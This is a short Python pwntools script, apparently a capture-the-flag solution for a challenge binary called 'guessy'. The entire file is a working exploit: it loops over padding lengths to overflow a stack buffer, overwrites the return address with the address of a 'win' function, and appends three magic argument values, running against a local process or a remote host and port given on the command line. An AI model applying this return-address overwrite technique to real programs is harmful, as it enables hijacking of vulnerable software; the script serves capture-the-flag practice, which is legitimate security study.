#!/usr/bin/python2

from pwn import *
import sys
import string
import time

context.log_level = 'DEBUG'
context.terminal = ['/usr/bin/termite', '-e']

e = ELF('./guessy')

for i in range(50):
    if len(sys.argv) == 3:
        p = remote(sys.argv[1], int(sys.argv[2]))
    else:
        p = process('./guessy')
        #gdb.attach(p, 'b *main+110\nc\n')

    p.recvuntil('!')
    p.sendline('a'*i
        + p32(e.sym.all_I_do_is_win)
        + p32(0xFEA51B1E)
        + p32(0xACCE5515)
        + p32(0x600DC0DE)
        )
    out = p.recvall()
    if 'flag' in out or 'Not quite.' in out:
        break
    p.close()
